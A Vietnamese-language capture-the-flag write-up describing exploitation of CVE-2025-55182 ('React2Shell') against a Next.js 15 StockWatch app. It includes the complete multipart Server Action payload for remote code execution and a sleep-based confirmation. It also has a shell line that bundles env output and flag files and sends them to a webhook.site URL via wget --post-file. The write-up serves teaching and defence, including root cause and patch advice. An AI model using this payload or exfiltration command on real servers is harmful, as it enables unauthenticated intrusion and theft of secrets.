# Dow is Up 50k — Writeup

> **Category:** Web / Next.js
> **Points:** 10
> **Service:** `http://18.215.143.250:3000`
> **Provided:** không có source — chỉ URL và hint *"When did you say you made this website?"*

## Flag

```
rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}
```

## Recon

Trang web **StockWatch** — portfolio tracker xây bằng **Next.js 15 · React 19**, chạy ở chế độ standalone (Docker, user `nextjs`, thư mục `/app`).

Các trang: `/` (dashboard), `/portfolio`, `/watchlist`, `/stock/[symbol]` (12 mã cổ phiếu). Không có API route, không có `.git`, không source map.

Điểm đáng chú ý nhất nằm ở footer của mọi trang:

> © 2025 StockWatch — **Next.js 15 · React 19 · Built Dec 2, 2025**

Còn HTTP response của static chunk lại cho ra `Last-Modified: Thu, 22 Oct 2026` — ngày build footer là **giả**.

**Hint "When did you say you made this website?"** chính là chỉ vào ngày build này: một app Next.js 15/React 19 "được tạo" trước cuối năm 2025 tức là dùng version React nằm trong vùng ảnh hưởng của **CVE-2025-55182 — "React2Shell"** (CVSS 10.0): RCE không xác thực qua deserialization của React Flight trong Server Actions.

## Khám phá Server Actions

Sàng lọc các JS chunk của client tìm `createServerReference` thu được 3 server action (gọi trực tiếp bằng `POST` với header `Next-Action: <id>` và body JSON):

| Action | ID | Tham số |
|--------|-----|---------|
| `searchStocks` | `40881a01…45af` | query string |
| `setPriceAlert` | `4052fdcd…18a` | symbol, targetPrice, direction, email |
| `addToWatchlist` | `40390aa0…7c7` | symbol |

Trong khi fuzz `searchStocks`, phát hiện hành vi bất thường: **query là chuỗi bắt đầu bằng `$` thì server treo cứng** (timeout), còn `$undefined`, `$D`, `$S`… trả 500 ngay:

```
'$'      -> timeout      '$@1'    -> timeout
'${x}'   -> timeout      '$Dtest' -> 500 (Date parse fail)
'$Stest' -> 500 (Symbol) '$$'     -> OK (escape)
'a$b@c'  -> OK
```

Đây chính là dấu vết của **Flight parser**: khi decode argument của server action, chuỗi có prefix `$` không được coi là chuỗi literal mà được diễn giải thành internal reference (`$@` = chunk/promise, `$Q` = server reference, `$D` = Date, `$S` = Symbol, `$$` = escape `$`, `$<hex>` = row reference…). Chuỗi `$` hợp lệ nhưng thiếu row dữ liệu → promise không bao giờ resolve → treo vĩnh viễn. Máy deserialization này chính là mục tiêu của React2Shell.

## Lỗ hổng: React2Shell (CVE-2025-55182)

Root cause nằm trong `parseModelString` / `getOutlinedModel` của `ReactFlightReplyServer.js`:

1. **Path traversal không sanitize:** reference dạng `"$1:a:b:c"` được tách theo `:` và từng đoạn dùng làm **property lookup trần** trên model. `"$1:__proto__:then"` → đi tới `Chunk.prototype.then`; `"$1:constructor:constructor"` → lấy được **Function constructor**.
2. **Fake chunk injection:** object JSON do attacker kiểm soát có `status:"resolved_model"` được xử lý như một Chunk nội bộ thật, kèm `_response` giả (`_prefix`, `_chunks`, `_formData`).
3. **Constructor substitution:** nhánh `$B` (Blob) trong `parseModelString` gọi `response._formData.get(prefix + id)` để đọc blob — nhưng `get` đã bị thay bằng Function constructor → `Function(_prefix + "1337")` biên dịch `_prefix` thành hàm, và promise machinery thấy `{then: <function>}` là thenable nên **tự động gọi nó** → thực thi code tuỳ ý.

## Payload

POST tới `/` với `Next-Action` header và `Content-Type: multipart/form-data`, 3 field:

```
0:  {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
     "value":"{\"then\":\"$B1337\"}",
     "_response":{"_prefix":"<JS>;","_chunks":"$Q2",
                  "_formData":{"get":"$1:constructor:constructor"}}}
1:  "$@0"
2:  []
```

Chuỗi khai thác: field 1 (`$@0`) buộc parser khởi tạo "chunk 0" chính là JSON ở field 0 → `__proto__.then` được dùng làm `.then` của chunk → `initializeModelChunk` JSON.parse và revive model với `_response` giả → `$B1337` rơi vào nhánh Blob → `Function("<JS>;1337")` được tạo và gọi.

## Xác nhận RCE và lấy flag

**Oracle time-based** (vì output không quay lại HTTP response): `execSync('sleep 12')` — Node chạy single-thread nên cả server đứng lại:

```
baseline ping: 0.9s
firing sleep 12 ...
ping during sleep: 11.9s   ← server bị chặn trọn 12 giây
ping again: 0.9s
```

RCE chắc chắn. Bước tiếp theo là exfil output:

- Ghi file vào `public/`, `.next/static/` đều thất bại (cwd là `/app`, không có thư mục public trong bản standalone).
- Dùng **webhook.site** làm kênh nhận dữ liệu — lưu ý server không có `curl` (nhánh `|| wget` chạy với stdin rỗng lần đầu), phải ghi ra file rồi `wget --post-file`:

```bash
(id; pwd; ls -la /; cat /flag*; env) > /tmp/o 2>&1
wget -q -O /dev/null --post-file=/tmp/o https://webhook.site/<uuid>
```

Kết quả từ `/flag.txt` (mode `r--r--r--`, 47 bytes):

```
rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}
```

## Tóm tắt

| Bước | Nội dung |
|------|----------|
| 1 | Hint + footer "Built Dec 2, 2025" → nhận diện React/Next nằm trong vùng CVE-2025-55182 (React2Shell) |
| 2 | Tìm 3 server action trong client chunks; phát hiện `$`-prefix trong argument được Flight parser diễn giải (treo/500) |
| 3 | Gửi multipart payload React2Shell: path traversal `$1:__proto__:then` + `$1:constructor:constructor` + fake chunk `$B1337` → RCE |
| 4 | Time-based oracle xác nhận (`sleep 12` chặn server), exfil qua `wget --post-file` về webhook |
| 5 | `/flag.txt` → `rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}` |

**Bài học:** React Flight (nền tảng của Server Actions) là một **deserialization format** — mọi dữ liệu client gửi lên đều đi qua parser có khả năng dựng lại object/reference. Việc property lookup trong `getOutlinedModel` không chặn `__proto__`/`constructor` cho phép vừa prototype pollution vừa leo thang lên Function constructor. Patch: nâng React/Next.js lên version đã fix (React >= 19.2.x tương ứng), chặn các property `__proto__`/`constructor`/`prototype` khi resolve reference path.

## Tham khảo

- [AI Slop NextJS RCE Write-Up — HerringtonDarkholme](https://gist.github.com/HerringtonDarkholme/87f14efca45f7d38740be9f53849a89f)
- [React2Shell CVE-2025-55182 Analysis — cnpanda.net](https://www.cnpanda.net/en/sec/react2shell-cve-2025-55182.html)
- [Complete Analysis of React2Shell — Enki](https://www.enki.co.kr/en/media-center/blog/complete-analysis-of-the-react2shell-cve-2025-55182-vulnerability)
